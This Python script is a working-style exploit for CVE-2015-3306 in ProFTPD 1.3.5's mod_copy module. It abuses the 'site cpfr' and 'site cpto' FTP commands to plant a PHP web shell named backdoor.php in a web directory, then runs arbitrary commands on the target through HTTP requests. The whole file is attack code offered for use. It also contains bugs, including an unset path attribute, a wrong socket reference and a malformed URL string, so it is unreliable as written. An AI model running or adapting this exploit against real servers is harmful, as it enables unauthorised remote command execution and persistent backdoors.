import argparse
from log_colors import *
import socket
import requests
import sys

# CVE-2015-3306
# The mod_copy module in ProFTPD 1.3.5 allows 
# remote attackers to read and write to arbitrary files 
# via the site cpfr and site cpto commands.
class CVE2015_3306:

    # params:
    # host - target vulnerable server
    # path - path accessible from web
    # cmd - php payload
    def __init__(self, host, path):
        self.host = host
        self.payload = "<?php echo passthru($_GET['cmd']); ?>"
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # run RCE
    def run(self):
        print (LogColors.BLUE + "run RCE on host: " + self.host + "..." + LogColors.ENDC)
        try:
            self.sock.connect((self.host, 21))
            print (LogColors.YELLOW + self.sock.recv(1024).decode("utf-8") + LogColors.ENDC)
            self.sock.send(('site cpfr /etc/passwd').encode("utf-8"))
            print (LogColors.YELLOW + self.sock.recv(1024).decode("utf-8") + LogColors.ENDC)
            self.sock.send(('site cpto ' + self.payload).encode("utf-8"))
            print (LogColors.YELLOW + self.sock.recv(1024).decode("utf-8") + LogColors.ENDC)
            self.sock.send(("site cpfr " + self.payload).encode("utf-8"))
            print (LogColors.YELLOW + self.sock.recv(1024).decode("utf-8") + LogColors.ENDC)

            self.sock.send(('site cpto /' + self.path.strip("/") + '/backdoor.php').encode("utf-8"))
            if "Copy successful" in sock.recv(1024):
                print (LogColors.GREEN + "successfully exploited :)" + LogColors.ENDC)
                print (LogColors.GREEN + "http://" + self.host + "/backdoor.php" + LogColors.ENDC)
            else:
                print (LogColors.RED + "not exploited. failed :(" + LogColors.ENDC)
            self.sock.close()
        except Exception as e:
            print (LogColors.RED + "not exploited. error :(" + LogColors.ENDC)
            print (LogColors.RED + str(e) + LogColors.ENDC)

    # run command after exploiting
    def cmd(self, cmd):
        print (LogColors.BLUE + "cmd: " + cmd + LogColors.ENDC)
        r = requests.get("http:// + " + self.host + "/backdoor.php?cmd=" + cmd)
        if r.ok:
            print (LogColors.YELLOW + r.text + LogColors.ENDC)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--target', required = True, help = "target host with proftpd")
    parser.add_argument('-d', '--dir', required = True, help = "directory accessible from web")
    parser.add_argument('-c', '--cmd', required = True, help = "command for check")
    args = vars(parser.parse_args())
    host, path = args['target'], args['dir']
    cmd = args['cmd']
    cve = CVE2015_3306(host, path)
    cve.run()
    cve.cmd(cmd)

